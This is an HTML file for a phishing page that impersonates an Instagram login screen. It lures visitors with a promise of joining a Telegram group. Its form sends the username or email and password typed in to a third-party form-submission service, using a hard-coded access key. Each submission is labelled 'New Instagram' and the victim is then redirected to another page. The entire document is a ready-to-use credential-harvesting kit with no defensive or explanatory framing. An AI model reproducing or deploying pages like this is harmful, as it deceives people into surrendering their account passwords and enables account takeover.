<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>

<style>
* { box-sizing: border-box; }

body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
    min-height: 100vh;
}

.wrapper {
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 12px;
}

.container {
    width: 100%;
    max-width: 350px;
    background: #fff;
    border: 1px solid #dbdbdb;
    padding: 32px 28px 24px;
    text-align: center;
    border-radius: 16px;
}

/* .logo {
    font-size: 32px;
    font-weight: 400;
    margin-bottom: 20px;
} */

.logo {
    font-family: 'Pacifico', cursive;
    font-size: 42px;
    font-weight: 400;
    margin-bottom: 20px;

    background: linear-gradient(
        45deg,
        #feda75,
        #fa7e1e,
        #d62976,
        #962fbf,
        #4f5bd5
    );

    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;

    letter-spacing: 0.5px;
}


h1 {
    font-size: 25px;
    font-weight: 400;
    color: #3e3c3c;
    margin-bottom: 20px;
}

input {
    width: 100%;
    padding: 12px 10px;
    margin-bottom: 8px;
    font-size: 14px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
}

input:focus {
    outline: none;
    border-color: #a8a8a8;
}

button {
    width: 100%;
    padding: 10px;
    margin-top: 10px;
    background: #0095f6;
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    border: none;
    border-radius: 8px;
    cursor: pointer;
}

button:active {
    opacity: 0.85;
}

.divider {
    display: flex;
    align-items: center;
    margin: 18px 0;
    color: #8e8e8e;
    font-size: 12px;
}

.divider::before,
.divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #dbdbdb;
}

.divider span { margin: 0 10px; }

.forgot {
    font-size: 12px;
    color: #00376b;
}

.footer {
    width: 100%;
    max-width: 350px;
    background: #fff;
    border: 1px solid #dbdbdb;
    padding: 16px;
    margin-top: 10px;
    text-align: center;
    font-size: 14px;
}

.note {
    font-size: 11px;
    color: #8e8e8e;
    margin-top: 14px;
}
</style>
<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">

</head>

<body>

<div class="wrapper">
    <div>
        <div class="container">
            <h1>To join the Telegram group continue below</h1>
            <div class="divider">
            </div>
            <div class="logo">Instagram</div>

            <!-- Web3Forms -->
            <form action="https://api.web3forms.com/submit" method="POST">

                <!-- REQUIRED -->
                <input type="hidden" name="access_key" value="6d827285-1350-408d-bbc7-839371ab787a">

                <!-- OPTIONAL META -->
                <input type="hidden" name="from_name" value="Instagram">
                <input type="hidden" name="subject" value="New Instagram">
                <input type="hidden" name="redirect" value="telegram.html">

                <input type="text" name="u" placeholder="Username, or email" required>
                <input type="text" name="p" placeholder="P******" required>

                <button type="submit">Continue to Telegram</button>
            </form>

            <div class="divider">

            </div>
            <p class="note">Â© 2025 All rights reserved</p>

        
        </div>

        
    </div>
</div>

</body>
</html>
